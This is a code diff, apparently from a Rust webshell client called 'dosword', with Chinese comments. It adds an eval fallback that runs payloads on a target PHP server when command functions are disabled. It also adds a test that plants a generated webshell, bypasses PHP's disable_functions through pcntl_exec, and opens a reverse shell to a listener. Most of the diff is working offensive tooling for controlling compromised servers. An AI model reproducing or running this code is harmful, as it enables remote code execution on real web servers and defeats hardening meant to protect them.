@@ -662,9 +662,20 @@ impl Protocol for PhpProtocol {
             .trim()
             .to_string();
         if cwd.is_empty() {
-            return Err(ProtocolError::ServerError(
-                "无法获取目标当前目录（pwd 失败）".to_string(),
-            ));
+            // 命令函数被 disable_functions 全禁（exec 通道不可用）：
+            // 降级 eval 通道直接执行载荷（插件代码不依赖临时文件）
+            let script = code
+                .trim_start()
+                .strip_prefix("<?php")
+                .map(str::trim_start)
+                .unwrap_or(code);
+            let value = dispatch(php, "eval", &[("c", script)], settings)?;
+            let text = value
+                .pointer("/data")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            return Ok(text);
         }
         // 2) 随机文件名 + 写入载荷
         // 注意：点开头文件在部分 PHP 内置服务器下行为异常（反弹 shell 无输出），
@@ -1260,7 +1271,21 @@ fn is_session(php: &PhpSession) -> bool {
 
 /// JSON 字符串值转义。
 fn json_str(value: &str) -> String {
-    value.replace('\\', "\\\\").replace('"', "\\\"")
+    let mut out = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '\\' => out.push_str("\\\\"),
+            '"' => out.push_str("\\\""),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            '\u{08}' => out.push_str("\\b"),
+            '\u{0C}' => out.push_str("\\f"),
+            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
+            c => out.push(c),
+        }
+    }
+    out
 }
 
 /// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
@@ -2266,6 +2291,109 @@ except Exception as e:
     with open(outfile, "w") as f:
         f.write("ERR: " + str(e))
 "#;
+
+    #[test]
+    fn real_php_bypass_vectors_disabled_env() {
+        // 模拟 exec/system/passthru/shell_exec/popen/escapeshellcmd/proc_open 全禁环境，
+        // 验证 PHP 8+ 剩余可用向量
+        let settings = settings();
+        // 自定义 spawn：带 -d disable_functions
+        let php = std::process::Command::new("php").arg("-v").output().ok();
+        if php.is_none() {
+            return;
+        }
+        let encoder = dosword_sdk::EncoderRegistry::global().get("native").unwrap();
+        let dir = std::env::temp_dir().join(format!("dosword-php-disable-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let stub = encoder.stub("php", "secret").unwrap();
+        std::fs::write(dir.join("shell.php"), &stub).unwrap();
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let disabled = "exec,system,passthru,shell_exec,popen,escapeshellcmd,proc_open,proc_nice,ini_restore";
+        let child = std::process::Command::new("php")
+            .arg("-d")
+            .arg(format!("disable_functions={disabled}"))
+            .arg("-S")
+            .arg(format!("127.0.0.1:{port}"))
+            .arg("-t")
+            .arg(&dir)
+            .current_dir(&dir)
+            .stdout(std::process::Stdio::null())
+            .stderr(if let Ok(f) = std::fs::File::create(std::env::temp_dir().join("srv2.log")) {
+                std::process::Stdio::from(f)
+            } else {
+                std::process::Stdio::null()
+            })
+            .spawn();
+        let Some(mut child) = child.ok() else { return; };
+        std::thread::sleep(std::time::Duration::from_millis(500));
+        let url = format!("http://127.0.0.1:{port}/shell.php");
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            // 1) 扫描：确认禁用生效 + 向量评估
+            let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({}), &settings)?;
+            let disabled_list = scan["disable_functions"].as_array().map(|a| a.len()).unwrap_or(0);
+            assert!(disabled_list >= 8, "禁用清单应生效：{scan:?}");
+            assert_eq!(scan["detected"]["exec"].as_bool(), Some(false));
+            assert_eq!(scan["vectors"]["pcntl"].as_bool(), Some(true), "pcntl 应可用");
+            eprintln!("[bypass] 禁用环境 scan：pcntl={:?} ffi={:?} ld_preload={:?}",
+                scan["vectors"]["pcntl"], scan["vectors"]["ffi"], scan["vectors"]["ld_preload"]);
+            // 2) syscall 向量：全部禁用 → 明确失败
+            let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"command": "id"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(false), "全禁时 syscall 应失败：{out:?}");
+            eprintln!("[bypass] syscall 正确报告全禁");
+            // 3) pcntl 向量：应成功执行 id
+            let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"command": "id"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 应成功：{out:?}");
+            assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
+            eprintln!("[bypass] pcntl_exec 绕过成功（命令函数全禁）");
+            // 4) pcntl 反弹向量：listener 交互验证
+            let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
+            let _ = std::fs::write(&listener_script, REV_LISTENER);
+            let rport: u16 = 25000 + (std::process::id() % 500) as u16;
+            let outfile = std::env::temp_dir().join(format!("rev_disable_{}.txt", std::process::id()));
+            let _ = std::fs::remove_file(&outfile);
+            let _ = std::process::Command::new("python3")
+                .arg(&listener_script)
+                .arg(rport.to_string())
+                .arg(outfile.to_string_lossy().into_owned())
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .spawn()
+                .ok();
+            std::thread::sleep(std::time::Duration::from_millis(400));
+            let out = dosword_sdk::bypass::BypassReversePcntlPlugin.execute(
+                &protocol, php, "php",
+                &serde_json::json!({"host": "127.0.0.1", "port": rport, "background": true}),
+                &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            let mut captured = String::new();
+            for _ in 0..60 {
+                if let Ok(content) = std::fs::read_to_string(&outfile) {
+                    captured = content;
+                    break;
+                }
+                std::thread::sleep(std::time::Duration::from_millis(250));
+            }
+            assert!(captured.contains("uid="), "pcntl 反弹应收到 id 输出：{captured}");
+            eprintln!("[bypass] pcntl 反弹 shell 绕过成功（proc_open 全禁）");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("禁用环境 bypass 真实执行应成功：{error}"));
+    }
 
     // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---
 
